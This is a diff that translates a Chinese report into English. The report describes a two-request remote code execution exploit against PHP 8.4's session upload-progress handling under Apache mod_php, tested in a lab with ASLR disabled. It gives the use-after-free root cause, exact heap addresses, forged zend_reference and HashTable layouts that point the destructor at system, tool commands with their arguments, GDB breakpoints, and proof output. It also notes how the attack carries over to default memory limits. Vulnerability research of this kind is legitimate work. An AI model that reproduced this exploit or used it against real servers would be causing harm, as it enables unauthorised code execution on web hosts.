@@ -1,46 +1,40 @@
-# 纯 HTTP、无目标侧 PHP 的 no-ASLR RCE 报告
+# no-ASLR RCE Report: Pure HTTP, No Target-Side PHP
 
-日期：2026-10-21
-目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（Debian 12 amd64 远程 lab）
-约束：**完全远程、只用 HTTP；不在目标 webroot 写任何特定 PHP 文件**。目标页面为普通
-`index.php`：
+Date: 2026-10-21
+Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64 remote lab)
+Constraints: **Fully remote, HTTP only, with no target-specific PHP files written to the target webroot.** The target page is the ordinary `index.php`:
 
-```php
+~~~php
 <?php
 echo "OK\n";
-```
+~~~
 
-本报告只覆盖 **no-ASLR** 结果。ASLR 的两条路径分析见 `ASLR_PATHS.md`。
+This report covers **no-ASLR** results only. Analysis of the two ASLR paths is in [ASLR_PATHS.md](ASLR_PATHS.md).
 
 ---
 
-## 1. 结论
+## 1. Result
 
-在关闭 ASLR 的 lab worker 上，已用 **两个纯 HTTP 请求** 打通 RCE：
+RCE was achieved on a lab worker with ASLR disabled using **two HTTP requests**:
 
-- 请求 A：`session.upload_progress` 解码大 session 时 OOM，留下跨请求的悬空
-  `PS(http_session_vars)` zend_reference。
-- 请求 B：multipart 字段分配/释放的 56 字节原始缓冲区重占旧 reference 所在的块，
-  把旧的 32 字节 reference 覆盖成伪造的 `zend_reference`；同时用一条**存活的**
-  192 字节 zend_string 承载 fake HashTable。B 的 END cleanup 调
-  `php_session_track_init()` → `zval_ptr_dtor` → `zend_array_destroy` →
-  `zend_hash_destroy`，`pDestructor` 落到 libc `system`。
+- Request A OOMs while `session.upload_progress` decodes a large session, leaving a dangling `PS(http_session_vars)` zend_reference across requests.
+- In request B, a 56-byte raw buffer allocated and freed for a multipart field reclaims the old reference's block, overwriting the old 32-byte reference with a fake `zend_reference`. A **live** 192-byte zend_string carries the fake HashTable. During B's END cleanup, `php_session_track_init()` → `zval_ptr_dtor` → `zend_array_destroy` → `zend_hash_destroy` calls libc `system` through `pDestructor`.
 
-实测执行：
+Observed command:
 
-```text
+~~~text
 system("id>/tmp/p1")
-```
+~~~
 
-proof（`/tmp/p1`，54 字节）：
+Proof file (`/tmp/p1`, 54 bytes):
 
-```text
+~~~text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+~~~
 
-gdb 关键回溯：
+Key GDB backtrace:
 
-```text
+~~~text
 #0  __libc_system (line=0x7ffff5e6e118 "id>/tmp/p1")
 #1  zend_hash_destroy (ht=0x7ffff5e6e0d8)
 #2  zend_array_destroy (ht=0x7ffff5e6e0d8)
@@ -50,80 +44,66 @@ gdb 关键回溯：
 #6  php_session_initialize ()
 #7  php_session_rfc1867_cleanup ()
 #8  php_session_rfc1867_callback ()
-```
+~~~
 
-`system` 返回后请求在 Zend MM 中 abort（`zend_mm_realloc_heap` 检测到堆不一致），
-但命令已经在 abort 前执行并写出 proof。worker 随后崩溃，符合一次利用的预期。
-
----
-
-## 2. 根因与触发点
-
-- 漏洞位置：`ext/session/session.c` 的 upload-progress 路径。
-- A 请求在 `php_request_startup` 阶段因 `session.upload_progress` 解码大 session
-  触发 OOM；bailout 后 `modules_activated=0`，session 的 RSHUTDOWN 被跳过。
-- 遗留状态：`PS(http_session_vars)` 是一个 **zend_reference**，其 `val.value`
-  指向 A 中分配的 session HashTable；该 reference 在 A 结束后仍被 B 的
-  `php_session_track_init()` 访问。
-- B 的 END cleanup 调用 `php_session_initialize()` → `php_session_track_init()`：
-  1. `zend_delete_global_variable("_SESSION")` 把 reference 的 refcount 从 2 减到 1；
-  2. `zval_ptr_dtor(&PS(http_session_vars))` 看到 refcount 1，调用
-     `zend_reference_destroy()`；
-  3. `zend_reference_destroy()` 对 `ref->val`（我们伪造为 IS_ARRAY）调用
-     `zend_array_destroy()`；
-  4. fake HashTable 的 `pDestructor = system`，`zend_hash_destroy()` 以
-     `&bucket->val`（命令字符串地址）调用 `system()`。
-
-整个触发在应用代码执行前完成，不需要应用调用任何 session API。
+After `system` returns, the request aborts in Zend MM (`zend_mm_realloc_heap` detects heap inconsistency), but the command has already run and written the proof. The worker then crashes, as expected for this one-shot exploit.
 
 ---
 
-## 3. 请求 B 的内存布局
+## 2. Root Cause and Trigger
 
-no-ASLR 下稳定地址：
+- Vulnerable path: the upload-progress path in `ext/session/session.c`.
+- Request A OOMs while decoding a large session through `session.upload_progress` during `php_request_startup`. After bailout, `modules_activated=0`, so session RSHUTDOWN is skipped.
+- Leftover state: `PS(http_session_vars)` is a **zend_reference** whose `val.value` points to the session HashTable allocated in A. After A ends, B's `php_session_track_init()` still accesses that reference.
+- B's END cleanup calls `php_session_initialize()` → `php_session_track_init()`:
+  1. `zend_delete_global_variable("_SESSION")` decreases the reference count from 2 to 1.
+  2. `zval_ptr_dtor(&PS(http_session_vars))` sees count 1 and calls `zend_reference_destroy()`.
+  3. `zend_reference_destroy()` calls `zend_array_destroy()` on `ref->val`, which we forged as IS_ARRAY.
+  4. The fake HashTable has `pDestructor = system`; `zend_hash_destroy()` calls `system()` with `&bucket->val` as the command string.
 
-| 对象 | 地址/偏移 |
+The trigger runs before application code and does not require the application to call any session API.
+
+---
+
+## 3. Request B Memory Layout
+
+Stable addresses with ASLR disabled:
+
+| Object | Address/offset |
 |---|---|
-| 旧 zend_reference（悬空）R0 | `0x7ffff5e02320` |
-| 重占 R0 的 56B 原始缓冲区起点 | `R0-0x10` |
-| fake HashTable 所在 192B zend_string 的 data | `0x7ffff5e6e0d8` (T+0x18) |
+| Old dangling zend_reference R0 | `0x7ffff5e02320` |
+| Start of 56-byte raw buffer reclaiming R0 | `R0-0x10` |
+| Data of the live 192-byte zend_string holding fake HashTable | `0x7ffff5e6e0d8` (T+0x18) |
 | libc `system` | `0x7ffff7d13490` |
-| libphp 基址（参考） | `0x7ffff47c0000` |
+| libphp base (reference) | `0x7ffff47c0000` |
 
-### 3.1 重占旧 reference 的原始缓冲区
+### 3.1 Raw Buffer Reclaims the Old Reference
 
-multipart 普通字段的值先由 `multipart_buffer_read_body()` 读入
-`erealloc(NULL, len+1)` 的**原始缓冲区**，内容从 offset 0 开始，回调/注册后才
-`efree()`；释放后内容仍在。选择字段值长度 55（分配 56B，Zend MM bin 6）。
+A normal multipart field value is read by `multipart_buffer_read_body()` into a **raw buffer** from `erealloc(NULL, len+1)`. The callback/registration happens before `efree()`; the contents remain after release. Choose a field value of length 55 (56-byte allocation, Zend MM bin 6).
 
-在 B 中通过 7 个“31 字符字段名 + L=47”的 priming 字段消耗 56B key 槽，使后续
-L=55 字段的 raw buffer 正好落在 `0x7ffff5e02310`（R0-0x10）。该块的 56 字节覆盖
-旧 32B reference 的 R0 区域：
+In B, seven priming fields with 31-character names and L=47 consume 56-byte key slots, causing the later L=55 field's raw buffer to land at `0x7ffff5e02310` (`R0-0x10`). Its 56 bytes cover the old 32-byte reference at R0:
 
-```text
+~~~text
 raw+0x10 (R0+0x00): gc: refcount=1, type=IS_REFERENCE (10)
-raw+0x18 (R0+0x08): val.value = fake HashTable data 地址
+raw+0x18 (R0+0x08): val.value = fake HashTable data address
 raw+0x20 (R0+0x10): val.type  = 0x307 (IS_ARRAY_EX)
 raw+0x28 (R0+0x18): zend_reference.sources = 0
-```
+~~~
 
-`zend_reference_destroy()` 要求 `sources.ptr == NULL`；否则 release 版
-`ZEND_ASSUME` 会导致 `__builtin_unreachable`/abort。
+`zend_reference_destroy()` requires `sources.ptr == NULL`; otherwise, the release build's `ZEND_ASSUME` causes `__builtin_unreachable`/abort.
 
-### 3.2 承载 fake HashTable 的存活字符串
+### 3.2 A Live String Holds the Fake HashTable
 
-不能用已释放的 raw buffer 承载 fake HashTable：释放后 allocator 会把
-`next_free_slot` 写到块 offset 0，覆盖 fake HashTable 的 `gc`，导致
-`i_zval_ptr_dtor` 的 `GC_DELREF` 不归零，不会进入 array dtor。
+A freed raw buffer cannot hold the fake HashTable: after release, the allocator writes `next_free_slot` at block offset 0, overwriting the fake HashTable's `gc`. Then `GC_DELREF` in `i_zval_ptr_dtor` does not reach zero, so the array destructor is not called.
 
-改用 **存活的 zend_string**：
+Use a **live zend_string** instead:
 
-- 字段值长度 167 → `zend_string_alloc` 大小 24+167+1=192，正好 bin 13（192B）。
-- 字符串保留在 `$_POST` 中，直到 request shutdown；在 B 的 END cleanup 时仍存活。
-- 字符串 data 从块起点 +24 开始，内容完全由字段值控制。
-- fake HashTable 直接放在 data offset 0：
+- A field value of length 167 gives `zend_string_alloc` a total size of 24+167+1=192 bytes, exactly Zend MM bin 13 (192B).
+- The string remains in `$_POST` through request shutdown and is still live during B's END cleanup.
+- String data begins 24 bytes from the block start, and the field value controls its contents.
+- Place the fake HashTable directly at data offset 0:
 
-```text
+~~~text
 data+0x00: gc refcount=1, type=IS_ARRAY (7)
 data+0x08: flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8
 data+0x10: arData = data+0x40
@@ -132,103 +112,93 @@ data+0x20: nTableSize=8, nInternalPointer=0
 data+0x28: nNextFreeElement=0
 data+0x30: pDestructor = system
 data+0x40: "id>/tmp/p1\0"
-data+0x60: 标记 0x1122334455667788（仅调试用）
-```
+data+0x60: marker 0x1122334455667788 (debugging only)
+~~~
 
-`zend_hash_destroy()` 走 `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES`
-分支，调用 `pDestructor(&p->val)`，即 `system(data+0x40)`。
+`zend_hash_destroy()` takes the `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES` branch and calls `pDestructor(&p->val)`, which is `system(data+0x40)`.
 
 ---
 
-## 4. 复现步骤
+## 4. Reproduction
 
-环境：
+Environment:
 
-- Apache prefork 单 worker，no-ASLR 启动：
+- One Apache prefork worker, started with ASLR disabled:
   `setarch $(uname -m) -R /usr/sbin/apache2ctl -k start`
-- PHP 配置：`memory_limit=8M`、`session.upload_progress.cleanup=On`、
-  `session.upload_progress.enabled=On`、`session.save_path=/tmp`、
-  `session.use_strict_mode=0`、`display_errors=On`。
-- webroot 只有普通 `index.php`（`echo "OK\n"`，无任何 session 调用）。
+- PHP settings: `memory_limit=8M`, `session.upload_progress.cleanup=On`, `session.upload_progress.enabled=On`, `session.save_path=/tmp`, `session.use_strict_mode=0`, and `display_errors=On`.
+- The webroot contains only the ordinary `index.php` (`echo "OK\n"`, with no session calls).
 
-请求 A（同目录工具 `send_a_ps.py`）：
+Request A (tool `send_a_ps.py` in the working directory):
 
-```bash
+~~~bash
 python3 send_a_ps.py 17 19 3 12
-# boundary 17B, PHPSESSID 19B, progress key 3B, 大字段 12MB
-```
+# 17B boundary, 19B PHPSESSID, 3B progress key, 12MB large field
+~~~
 
-A 的目的：在 upload-progress 解码时 OOM，留下跨请求悬空 reference。
-A 结束后 worker 仍可继续处理 B（本 lab 中 session 的 RSHUTDOWN 被跳过）。
+A OOMs while decoding upload progress and leaves a dangling reference across requests. The worker can still handle B in this lab because session RSHUTDOWN was skipped.
 
-请求 B（`send_b_rce2.py`）：
+Request B (`send_b_rce2.py`):
 
-```bash
+~~~bash
 python3 send_b_rce2.py \
   7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
-# N1=7 priming 字段；N2=2 个 L=55 fake-ref 字段
-# HTDATA=fake HashTable data 地址；SYS=system 地址
-```
+# N1=7 priming fields; N2=2 fake-reference fields with L=55
+# HTDATA=fake HashTable data address; SYS=system address
+~~~
 
-B 的 multipart：
+B's multipart body contains:
 
 - `PHPSESSID=attacksessionid0001`
 - `PHP_SESSION_UPLOAD_PROGRESS=pwn`
-- 7 × 31 字符字段名（`a000...`），值 = 167B fake HashTable
-- 2 × 短字段名（`f00`,`f01`），值 = 55B fake reference
-- boundary = `B`×10，末尾正常闭合
+- Seven fields with 31-character names (`a000...`), each holding the 167-byte fake HashTable
+- Two fields with short names (`f00`, `f01`), each holding the 55-byte fake reference
+- A 10-character `B` boundary with a normal closing marker
 
-检查：
+Check the result:
 
-```bash
+~~~bash
 cat /tmp/p1
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+~~~
 
-### 4.1 关键 gdb 观察点
+### 4.1 Key GDB Breakpoints
 
-```gdb
+~~~gdb
 b php_session_track_init
-# 打印 ps_globals.http_session_vars.value.ptr 及其指向的 fake reference
+# Print ps_globals.http_session_vars.value.ptr and the fake reference it points to
 b zend_reference_destroy if $rdi == 0x7ffff5e02320
 b zend_array_destroy   if $rdi == 0x7ffff5e6e0d8
 b zend_hash_destroy    if $rdi == 0x7ffff5e6e0d8
 b system
-```
+~~~
 
-实际命中：
+Observed hits:
 
-```text
+~~~text
 REF rdi=0x7ffff5e02320
 ARR T  ht=0x7ffff5e6e0d8
 HASH T ht=0x7ffff5e6e0d8
 SYSTEM rdi=0x7ffff5e6e118 [id>/tmp/p1]
-```
+~~~
 
 ---
 
-## 5. 工具与文件
+## 5. Tools and Files
 
-| 文件 | 用途 |
+| File | Purpose |
 |---|---|
-| `tools/send_a_ps.py` | A：upload-progress 大字段 OOM，留下悬空 reference |
-| `tools/send_b_align.py` | B 的字段长度/数量对齐实验（找 56B raw buffer 落点） |
-| `tools/send_b_rce2.py` | 最终 B：fake reference + 存活字符串 fake HashTable + system |
-| `tools/send_b_rce.py` | 早期版本（fake HT 放在已释放 raw buffer，gc 会被 free-list 覆盖，不可用） |
-| `logs/noaslr_rce.log` | 成功运行的 gdb/system/proof 记录 |
+| `tools/send_a_ps.py` | A: OOM on a large upload-progress field, leaving a dangling reference |
+| `tools/send_b_align.py` | B field length/count alignment experiments to find the 56-byte raw-buffer location |
+| `tools/send_b_rce2.py` | Final B: fake reference, live-string fake HashTable, and system |
+| `tools/send_b_rce.py` | Earlier version; the fake HT was in a freed raw buffer, so the free-list overwrote gc and it did not work |
+| `logs/noaslr_rce.log` | GDB, system, and proof records from a successful run |
 
 ---
 
-## 6. 限制与边界
+## 6. Limits and Scope
 
-1. **仅 no-ASLR**：R0、fake HT data、system 地址均为硬编码。ASLR 打开后地址变化。
-2. **memory_limit**：本 lab 用 8M 让 A 容易 OOM。默认 `memory_limit=128M` 时，
-   A 需要构造超过 128M 的 session 数据（可行但流量大）；`session.upload_progress`
-   默认开启、cleanup 默认 On。
-3. **请求 B 后 worker abort**：`system` 返回后 `zend_hash_destroy` 的
-   `pefree(HT_GET_DATA_ADDR)` 释放了字符串内部指针，Zend MM 检测到堆不一致并
-   abort。proof 已写出；若需要继续利用同一进程，需要把 fake HT 放到可合法释放的
-   分配块或修正 nTableMask，使 `HT_GET_DATA_ADDR` 为分配起点。
-4. **依赖 B 的精确 56B/192B 分配顺序**：N1=7、字段名长度 31、L=167/L=55、
-   boundary 10 是实测组合；换 PHP 构建/配置/请求顺序需重新校准。
-5. **不涉及应用代码**：目标页面不需要任何 session 调用；触发在 RINIT/解析阶段。
+1. **No-ASLR only:** R0, fake HT data, and the system address are hard-coded. They change when ASLR is enabled.
+2. **memory_limit:** This lab uses 8M to make A OOM easily. With the default `memory_limit=128M`, A needs to build over 128M of session data (possible, but requires high traffic). `session.upload_progress` is enabled by default, and cleanup defaults to On.
+3. **Worker aborts after request B:** After `system` returns, `pefree(HT_GET_DATA_ADDR)` in `zend_hash_destroy` frees an interior string pointer. Zend MM detects the inconsistency and aborts. The proof is already written. To continue using the same process, place the fake HT in a legitimately releasable allocation or fix `nTableMask` so `HT_GET_DATA_ADDR` points to the allocation start.
+4. **Exact 56B/192B allocation order in B:** N1=7, 31-character field names, L=167/L=55, and a 10-character boundary form the measured combination. Recalibrate for other PHP builds, settings, or request order.
+5. **No application code required:** The target page needs no session calls; the trigger occurs during RINIT/request parsing.
